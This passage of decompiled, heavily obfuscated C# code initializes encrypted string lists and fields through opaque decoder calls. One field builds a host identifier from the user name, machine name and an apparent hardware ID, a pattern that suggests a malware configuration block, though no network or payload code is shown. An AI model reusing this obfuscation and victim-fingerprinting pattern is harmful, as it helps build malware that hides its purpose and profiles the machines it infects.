			iWzroveCagNOUOgR(getString_0(107381883)),
			iWzroveCagNOUOgR(getString_0(107382378)),
			iWzroveCagNOUOgR(getString_0(107382297)),
			iWzroveCagNOUOgR(getString_0(107382280)),
			iWzroveCagNOUOgR(getString_0(107382215)),
			iWzroveCagNOUOgR(getString_0(107381594)),
			iWzroveCagNOUOgR(getString_0(107381565))
		};
		EuyTUVwaghbjWq = new List<string>
		{
			iWzroveCagNOUOgR(getString_0(107381508)),
			iWzroveCagNOUOgR(getString_0(107381475)),
			iWzroveCagNOUOgR(getString_0(107381398)),
			iWzroveCagNOUOgR(getString_0(107381381)),
			iWzroveCagNOUOgR(getString_0(107381860)),
			iWzroveCagNOUOgR(getString_0(107381779)),
			iWzroveCagNOUOgR(getString_0(107381766)),
			iWzroveCagNOUOgR(getString_0(107381733)),
			iWzroveCagNOUOgR(getString_0(107381700)),
			iWzroveCagNOUOgR(getString_0(107381667)),
			iWzroveCagNOUOgR(getString_0(107381634)),
			iWzroveCagNOUOgR(getString_0(107381089)),
			iWzroveCagNOUOgR(getString_0(107381016)),
			iWzroveCagNOUOgR(getString_0(107380975)),
			iWzroveCagNOUOgR(getString_0(107380962)),
			iWzroveCagNOUOgR(getString_0(107380929)),
			iWzroveCagNOUOgR(getString_0(107380856)),
			iWzroveCagNOUOgR(getString_0(107381335)),
			iWzroveCagNOUOgR(getString_0(107381294)),
			iWzroveCagNOUOgR(getString_0(107381285)),
			iWzroveCagNOUOgR(getString_0(107381252)),
			iWzroveCagNOUOgR(getString_0(107381179)),
			iWzroveCagNOUOgR(getString_0(107381146)),
			iWzroveCagNOUOgR(getString_0(107381508)),
			iWzroveCagNOUOgR(getString_0(107381105)),
			iWzroveCagNOUOgR(getString_0(107413352)),
			iWzroveCagNOUOgR(getString_0(107413275)),
			iWzroveCagNOUOgR(getString_0(107413242)),
			iWzroveCagNOUOgR(getString_0(107413201)),
			iWzroveCagNOUOgR(getString_0(107413192)),
			iWzroveCagNOUOgR(getString_0(107413159)),
			iWzroveCagNOUOgR(getString_0(107413118)),
			iWzroveCagNOUOgR(getString_0(107413557)),
			iWzroveCagNOUOgR(getString_0(107381475)),
			iWzroveCagNOUOgR(getString_0(107413516)),
			iWzroveCagNOUOgR(getString_0(107381398)),
			iWzroveCagNOUOgR(getString_0(107413515)),
			iWzroveCagNOUOgR(getString_0(107413482)),
			iWzroveCagNOUOgR(getString_0(107413441)),
			iWzroveCagNOUOgR(getString_0(107413408)),
			iWzroveCagNOUOgR(getString_0(107412823)),
			iWzroveCagNOUOgR(getString_0(107412782)),
			iWzroveCagNOUOgR(getString_0(107412749)),
			iWzroveCagNOUOgR(getString_0(107412716)),
			iWzroveCagNOUOgR(getString_0(107412707)),
			iWzroveCagNOUOgR(getString_0(107412634)),
			iWzroveCagNOUOgR(getString_0(107412593))
		};
		YxhEsnxKVPVIG = new List<string>
		{
			iWzroveCagNOUOgR(bnFgySFPvGNkn(getString_0(107413096))),
			iWzroveCagNOUOgR(getString_0(107413015)),
			iWzroveCagNOUOgR(getString_0(107412922)),
			iWzroveCagNOUOgR(getString_0(107412313)),
			iWzroveCagNOUOgR(getString_0(107412252)),
			iWzroveCagNOUOgR(getString_0(107412123)),
			iWzroveCagNOUOgR(getString_0(107412574)),
			iWzroveCagNOUOgR(getString_0(107412477)),
			iWzroveCagNOUOgR(getString_0(107412384)),
			iWzroveCagNOUOgR(getString_0(107411775)),
			iWzroveCagNOUOgR(getString_0(107411682)),
			iWzroveCagNOUOgR(getString_0(107411585)),
			iWzroveCagNOUOgR(getString_0(107412004)),
			iWzroveCagNOUOgR(bnFgySFPvGNkn(getString_0(107413096)))
		};
		abdHCeUGVK = iWzroveCagNOUOgR(getString_0(107411907));
		mTjzKFABFlRPD = new List<string>
		{
			iWzroveCagNOUOgR(getString_0(107411250)),
			iWzroveCagNOUOgR(getString_0(107411056)),
			iWzroveCagNOUOgR(getString_0(107411374)),
			iWzroveCagNOUOgR(getString_0(107410668)),
			iWzroveCagNOUOgR(getString_0(107411018)),
			iWzroveCagNOUOgR(getString_0(107410824))
		};
		iSBgDeZeUJkg = new List<string>
		{
			iWzroveCagNOUOgR(getString_0(107410118)),
			iWzroveCagNOUOgR(getString_0(107410057)),
			iWzroveCagNOUOgR(getString_0(107410476))
		};
		nFxEalhYYCjpL = getString_0(107396840);
		CZjeZpoOaBnWY = getString_0(107396840);
		fgPtuXEkZLaHJD = new DateTime(2000, 1, 1);
		YAumgqZlOtmhY = new DateTime(2100, 1, 1);
		acYBptnuBPuI = getString_0(107396835);
		IaLlphSuwiBhw = getString_0(107392880);
		CnIdBEsRRFvc = getString_0(107396840);
		QRAVrNWYboLLkW = getString_0(107396840);
		nmnOVCJgTpDc = getString_0(107396840);
		vDPjztkQJXZ = getString_0(107396840);
		RFlzVSEmhVRu = getString_0(107396840);
		OVQFJzgWysqwhUU = getString_0(107396840);
		PAVedODhIceUP = new List<string>
		{
			getString_0(107395850),
			getString_0(107396044),
			getString_0(107395852),
			getString_0(107395413)
		};
		izFJcfRSIdsTE = getString_0(107396840);
		jXqLQoucvHzVUL = getString_0(107410415);
		kgKCLKpybxy = getString_0(107396840);
		DxLtCSnkczui = getString_0(107396840);
		JpnrHsWYSseT = getString_0(107396840);
		MSnaZcaVNlKnHeD = string.Empty;
		CQdUFfqZbG = getString_0(107396840);
		sqKGSbKKNklysTXUM = getString_0(107396840);
		tzzfSLPHYSUvx = getString_0(107396840);
		oOHJagQRGgL = getString_0(107395158);
		qgrrwNVhThZQ = getString_0(107395158);
		eIuqMMBRyBNjhwm = getString_0(107396840);
		MuPMQecWyntAc = getString_0(107396840);
		sbRMnDSlEApwJ = getString_0(107396840);
		TlTdnQphJLOy = getString_0(107396840);
		SMxIgRfclz = getString_0(107396840);
		QZsBHkBpjECwVs = getString_0(107410442);
		jDiJDMgRCgs = getString_0(107396840);
		KEvGjNNtOiZocQ = getString_0(107396840);
		BreVYNEaqInZ = getString_0(107410393);
		VMaIlgsPdNUXjXpk = getString_0(107396840);
		JUOcohxOPRCTwG = getString_0(107396840);
		TwVGaILieUVRn = getString_0(107396840);
		ECUEIqzZOk = getString_0(107396840);
		bNoLNbcKQsXj = getString_0(107410404);
		deCuUcznmqYI = getString_0(107396835);
		iunmsWwxJij = getString_0(107396840);
		FxhLAZMgieEXYdo = getString_0(107396840);
		LhiuvUHhkI = getString_0(107396840);
		geAadizFUr = new string[0];
		YCyjCQiwEiQ = getString_0(107396840);
		mvEARGpSInJD = true;
		StVsmnoWHmXuLw = getString_0(107396840);
		nXPdGXfAViu = false;
		fRkJrERnVT = false;
		TIvVZDojNzsxO = false;
		baEcrAPcrRB = false;
		NarcQCMbbNaqtU = getString_0(107410359);
		ySPgVCqYcWT = false;
		MilMuMTovZx = false;
		acOyjecWJrE = false;
		wdtSggURCxcnGd = false;
		krgzddxGYNU = true;
		oztksqPDRCM = getString_0(107410370) + Environment.UserName + getString_0(107410325) + Environment.MachineName + getString_0(107410336) + vYNZTwVhFOANy.kIGHOBEUhMtWMkFKG() + getString_0(107410299);
		qPogNmZXCL = false;
		xyLxSGfFZpX = new Stopwatch();
		aZPMuiXAvDSZE = 0;
		ePwuTuiAXFH = 0;
		DiqbXqqefPkiW = false;
		NHtXqRcSpHaMt = getString_0(107410290) + vYNZTwVhFOANy.kIGHOBEUhMtWMkFKG() + getString_0(107410313);
	}
}
